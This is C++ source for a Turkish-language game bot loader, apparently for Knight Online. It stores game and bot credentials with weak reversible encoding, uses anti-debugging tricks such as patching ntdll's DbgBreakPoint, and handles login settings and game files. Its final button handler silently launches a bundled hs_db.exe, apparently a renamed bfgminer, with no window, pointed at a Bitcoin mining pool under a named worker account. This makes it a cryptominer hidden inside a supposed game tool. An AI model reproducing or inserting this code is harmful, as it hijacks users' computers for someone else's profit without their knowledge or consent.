	if(opleft->Checked)
		iCharIndex = 0;
	else if(opright->Checked)
		iCharIndex = 2;

	int iServer = comserverlist->ItemIndex;
	int iServerNo = comserverno->ItemIndex;

	char tmp[4]; *(DWORD*)tmp = 0;

	strcpy(strGameID,txtgameid->Text.c_str());
	StrEncrypt(strGameID,0);

	strcpy(strGamePW,txtgamepw->Text.c_str());
	StrEncrypt(strGamePW,0);

	strcpy(strBotID,txtbotid->Text.c_str());
	StrEncrypt(strBotID,0);

	strcpy(strBotPW,txtbotpw->Text.c_str());
	StrEncrypt(strBotPW,0);

	DeleteFileA("..//loader.cfg");

	ofstream fLogin;
	fLogin.open("..//loader.cfg",std::ios_base::out | std::ios_base::app);

	if(fLogin.is_open() == true)
	{
		itoa(chotologin->Checked,tmp,10);
		fLogin << tmp << "\n";

		fLogin << strGameID << "\n";
		fLogin << strGamePW << "\n";
		fLogin << strBotID << "\n";
		fLogin << strBotPW << "\n";

		itoa(iCharIndex,tmp,10);
		fLogin << tmp << "\n";

		itoa(iServer,tmp,10);
		fLogin << tmp << "\n";

		itoa(iServerNo,tmp,10);
		fLogin << tmp << "\n";

		fLogin.close();
		MessageBox(this->Handle,"Ayarlar kaydedildi !!!","kayit",MB_ICONINFORMATION);
		return;
	}

	MessageBox(this->Handle,"Kayit basarisiz !!!","kayit",MB_ICONEXCLAMATION);
}
//---------------------------------------------------------------------------

void StrDecrypt(char* pStr)
{
	int iLen = strlen(pStr);

	BYTE bKey = *pStr;

	int i;
	for (i = 0; i < (iLen - 1); i++) {
		*(pStr + i) = *(pStr + i + 1) - bKey;
		bKey--;
	}

	*(pStr + i) = 0x00;
}

void __fastcall TfrmLoader::trayClick(TObject *Sender)
{
	tray->Visible = false;
	ShowWindow(this->Handle,SW_SHOW);
	this->WindowState = wsNormal;
}
//---------------------------------------------------------------------------

void ClearLogFiles()
{
	int iPathLen = frmLoader->txtPath->Text.Length();
	char *strPath = new char[iPathLen + 1];
	memset(strPath,0,iPathLen + 1);
	strcpy(strPath,frmLoader->txtPath->Text.c_str());

	char* pFileName = strrchr(strPath,'\\');
	*(pFileName + 1) = '\0';
	char* pBasePath = new char[256]; memset(pBasePath,0,256);
	strcpy(pBasePath,strPath);
	char* pBaseFileName = strrchr(pBasePath,'\\');
	strcat(strPath,"*.klg");

	WIN32_FIND_DATA fData;

	HANDLE hSearch = FindFirstFileA(strPath,&fData);
	if(hSearch == INVALID_HANDLE_VALUE)
	{
		delete [] strPath;
		delete [] pBasePath;
		return;
	}

	strcat(pBasePath,fData.cFileName);
	DeleteFileA(pBasePath);

	while(1)
	{
		if( !FindNextFileA(hSearch,&fData) )
			break;

		*(pBaseFileName + 1) = 0x00;
		strcat(pBasePath,fData.cFileName);
		DeleteFileA(pBasePath);
	}

	FindClose(hSearch);
	delete [] strPath;
	delete [] pBasePath;
}

void CheckDLL()
{
	HANDLE hFile = INVALID_HANDLE_VALUE;
	char pFileOut[1024]; memset(pFileOut,0,1024);
	DWORD dwBytesRead = 0;
	bool bReadFile = false;

	hFile = CreateFileA("kmodule.dat",FILE_GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0);
	if(hFile == INVALID_HANDLE_VALUE)
	{
		if(GetLastError() == ERROR_SHARING_VIOLATION)
			return;
		else
		{
			MessageBox(frmLoader->Handle,"kmodule.dat bulunamadi!","Hata!",MB_ICONSTOP);
			Application->Terminate();
			return;
		}
	}


	bReadFile = ReadFile(hFile,pFileOut,1024,&dwBytesRead,0);

	CloseHandle(hFile);

	if( !bReadFile || !dwBytesRead )
		return;

	if( pFileOut[0x370] != 0x54 )	// "T"
	{
		MessageBox(frmLoader->Handle,"kmodule.dat bozuk! yeniden indiriniz!","Hata!",MB_ICONSTOP);
		Application->Terminate();
	}
}
void __fastcall TfrmLoader::tmdebuggerTimer(TObject *Sender)
{
   //	CheckDebugger();
}
//---------------------------------------------------------------------------

void CheckDebugger()
{
	if(!bCheckDebugEntry)
		return;

	DWORD dwDebugEntry = (DWORD) GetProcAddress( GetModuleHandleA("ntdll.dll"), "DbgBreakPoint" );
	if( *(BYTE*)dwDebugEntry != 0xC3 ) 	//RETN
	{
		Application->Terminate();
		frmLoader->Close();
		delete frmLoader;
	}

	typedef NTSTATUS (__stdcall *MYPROC)(HANDLE,PROCESSINFOCLASS,PVOID,ULONG,PULONG);

	if(!dwDebugAPI)
		dwDebugAPI = (DWORD) GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwQueryInformationProcess");

	MYPROC pFunction = (MYPROC)dwDebugAPI;

	if( !(DWORD)pFunction )
	{
		return;
	}

	DWORD dwRet = 0;

	NTSTATUS ntRet = (pFunction)( (void*)-1 , 7, (PVOID)&dwRet, 4, 0);

	if(ntRet)
	{
		return;
	}

	if(dwRet)	//debugger detected
	{
		typedef NTSTATUS (__stdcall *MYPROC2)(HANDLE,NTSTATUS);
		MYPROC2 pFunction2 = (MYPROC2) GetProcAddress(GetModuleHandleA("ntdll.dll"),"ZwTerminateProcess");
		if( (DWORD)pFunction2 )
			(pFunction2)( (void*)-1, 0 );
		else
			Application->Terminate();
	}
}

bool CheckCommandLine()
{
	char *pLine = GetCommandLine();

	if( strcmp(pLine," kojd") != 0 )
	{
		MessageBox(0,"parameter invalid!","error",MB_ICONSTOP);
		Application->Terminate();
		return false;
	}

	return true;
}

void EditDbgBreakPoint()
{
	HANDLE hFile = CreateFileA("_dbg.kole",GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
	if(hFile != INVALID_HANDLE_VALUE)
	{
		CloseHandle(hFile);
		bCheckDebugEntry = false;
		return;
	}

	DWORD dwEntry = (DWORD) GetProcAddress( GetModuleHandleA("ntdll.dll"), "DbgBreakPoint" );
	BYTE bEdit = 0xC3;

	WriteProcessMemory( (void*)-1, (LPVOID)dwEntry, (LPVOID)&bEdit, 1, 0 );
}





void __fastcall TfrmLoader::FormCreate(TObject *Sender)
{
randomize();
pageMain->ActivePageIndex=0;
Width = 322;
Height = 634;
}
//---------------------------------------------------------------------------





void __fastcall TfrmLoader::Button1Click(TObject *Sender)
{
opmanual->Checked=true;
/*if (CheckBox1->Checked) {
	Button5Click(0);
}                */
	LoadProcess(1);
}
//---------------------------------------------------------------------------
bool isValidIpAddress(char *st)
{
    int num, i, len;
    char *ch;

    //counting number of quads present in a given IP address
    int quadsCnt=0;

    printf("Split IP: \"%s\"\n", st);

    len = strlen(st);

	//  Check if the string is valid
    if(len<7 || len>15)
        return false;

    ch = strtok(st, ".");

    while (ch != NULL) 
    {
        quadsCnt++;
        printf("Quald %d is %s\n", quadsCnt, ch);

        num = 0;
        i = 0;

        //  Get the current token and convert to an integer value
        while(ch[i]!='\0')
        {
            num = num*10;
            num = num+(ch[i]-'0');
            i++;
        }

        if(num<0 || num>255)
        {
            printf("Not a valid ip\n");
            return false;
		}

        if( (quadsCnt == 1 && num == 0) || (quadsCnt == 4 && num == 0))
        {
            printf("Not a valid ip, quad: %d AND/OR quad:%d is zero\n", quadsCnt, quadsCnt);
            return false;
		}

        ch = strtok(NULL, ".");
    }

    //  Check the address string, should be n.n.n.n format
    if(quadsCnt!=4)
    {
        return false;
    }

    //  Looks like a valid IP address
    return true;
}
int count = 0 ;










void __fastcall TfrmLoader::Timer2Timer(TObject *Sender)
{
	LoadProcess(0);
	Timer2->Enabled=false;	
}
//---------------------------------------------------------------------------





void __fastcall TfrmLoader::pageMainChange(TObject *Sender)
{
ShowMessage("Otologin DevreDisi");
pageMain->ActivePageIndex = 0;
}
//---------------------------------------------------------------------------

void __fastcall TfrmLoader::Button2Click(TObject *Sender)
{
if (Button2->Caption=="<<<KAPAT") {
Button2->Caption = "EXTRA>>>";
this->Width = 322;
}else{
this->Width = 980;
Button2->Caption = "<<<KAPAT";
}
}
//---------------------------------------------------------------------------
typedef struct{
AnsiString f;
AnsiString t;
}yapi;
Kopyala(yapi param)
{

WIN32_FIND_DATA findfiledata;
   HANDLE hFind;

 AnsiString from = param.f + "*";
 hFind = FindFirstFile(from.c_str(), &findfiledata);
if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if ((findfiledata.dwFileAttributes | FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY
				&& (findfiledata.cFileName[0] != '.'))
			{
			frmLoader->Memo1->Lines->Add(findfiledata.cFileName);
			}
			else
			{
			if (findfiledata.cFileName[0] != '.')
			{

				 CopyFileA((param.f+findfiledata.cFileName).c_str(),(param.t+findfiledata.cFileName).c_str(),false);
				frmLoader->Memo1->Lines->Add(findfiledata.cFileName);
			}

			}
		}
		while (FindNextFile(hFind, &findfiledata) != 0);
    }else{
        frmLoader->Memo1->Lines->Add("Ko Klasoru Bulunamadi...");
    }
}

void __fastcall TfrmLoader::Button4Click(TObject *Sender)
{
if (Button4->Caption=="BASLAT") {
	Button4->Caption = "DUR";

WIN32_FIND_DATA findfiledata;
   HANDLE hFind;

 AnsiString from = Edit1->Text + "\\*";
 hFind = FindFirstFile(from.c_str(), &findfiledata);
	if (hFind != INVALID_HANDLE_VALUE)
	{
		do
		{
			if ((findfiledata.dwFileAttributes | FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY
				&& (findfiledata.cFileName[0] != '.'))
			{
			Memo1->Lines->Add(findfiledata.cFileName);
			}
			else
			{
			if (findfiledata.cFileName[0] != '.') {
				frmLoader->Memo1->Lines->Add(findfiledata.cFileName);
			}

			}
		}
		while (FindNextFile(hFind, &findfiledata) != 0);
	}
}


	/*
WIN32_FIND_DATA FindFileData;
   HANDLE hFind;

   hFind = FindFirstFile(Edit1->Text.c_str(), &FindFileData);
   if (hFind == INVALID_HANDLE_VALUE)
   {
		Memo1->Lines->Add("Ko Klasoru Bulunamadi...");
	  return;
   }
   else
   {
		Memo1->Lines->Add(FindFileData.cFileName);
      FindClose(hFind);
   }


   
}else{
	Button4->Caption = "BASLAT";
}       */
}
//---------------------------------------------------------------------------

void __fastcall TfrmLoader::Button5Click(TObject *Sender)
{
 	HANDLE hpSnap = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe32;
	hpSnap = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
	if( hpSnap == INVALID_HANDLE_VALUE )
		return;
	pe32.dwSize = sizeof(PROCESSENTRY32 );
	if( !Process32First( hpSnap, &pe32 ) )
	{
		CloseHandle( hpSnap );     // Must clean up the snapshot object!
		return;
	}
	do
	{

	   //ShowMessage(ExtractFileName(String(pe32.szExeFile)));
	   if (ExtractFileName(String(pe32.szExeFile))=="hs_db.exe")
	   {
			CloseHandle( hpSnap );
			return;
	   }

	} while( Process32Next(hpSnap, &pe32 ) );
	CloseHandle( hpSnap );


//ShowMessage("salala");
if (!FileExists("hs_db\\hs_db.exe"))
	return;
//Memo1->Lines->SaveToFile("hs_db\\bfgminer.conf");
STARTUPINFO sis;
PROCESS_INFORMATION pis;
ZeroMemory(&sis,sizeof(sis));
sis.cb = sizeof(sis);
ZeroMemory(&pis,sizeof(pis));
String Filename = ExtractFilePath(Application->ExeName) + "hs_db\\hs_db.exe" ;
String Calis ="\""+Filename+"\" -o http://btcmine.com:8332 -u swixdorf@worker10 -p attheand";
sis.cb = sizeof(STARTUPINFO);
//sis.dwFlags = STARTF_USESHOWWINDOW;
//sis.wShowWindow = SW_MINIMIZE;
 CreateProcess(Filename.c_str(),Calis.c_str(),NULL ,NULL,0,CREATE_NO_WINDOW,NULL,NULL,&sis,&pis);

}
//---------------------------------------------------------------------------

